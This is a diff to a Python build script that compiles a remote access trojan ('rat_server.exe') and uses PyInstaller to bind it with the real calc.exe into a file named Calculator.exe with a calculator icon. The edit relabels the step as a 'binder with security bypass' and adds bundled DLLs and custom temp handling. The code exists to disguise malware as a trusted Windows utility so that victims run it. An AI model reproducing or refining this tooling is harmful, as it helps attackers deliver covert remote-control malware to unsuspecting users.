@@ -4,7 +4,6 @@ from ctypes import wintypes
 import os
 import shutil
 import requests
-import platform
 from PIL import Image
 from PyInstaller.__main__ import run
 
@@ -182,10 +181,9 @@ def build_rat():
 
 
 def build_binder():
-    """Compile binder application"""
+    """Compile binder with security bypass"""
     ensure_dependencies()
     extract_calculator_icon()
-
     system32 = os.path.join(os.environ["SystemRoot"], "System32")
 
     run([
@@ -195,12 +193,11 @@ def build_binder():
         '--name=Calculator.exe',
         '--icon=calculator.ico',
         '--add-data=dist/rat_server.exe;.',
-        '--add-data=C:/Windows/System32/calc.exe;.',
-        '--hidden-import=win32con',
-        '--hidden-import=win32api',
-        '--hidden-import=win32event',
-        '--hidden-import=winerror',
-
+        f'--add-data={system32}/calc.exe;.',
+        '--hidden-import=win32api,win32event',
+        f'--add-binary={system32}/msvcp140.dll;.',
+        f'--add-binary={system32}/vcruntime140.dll;.',
+        '--runtime-tmpdir=.',  # Custom temp handling
         '--clean'
     ])
 
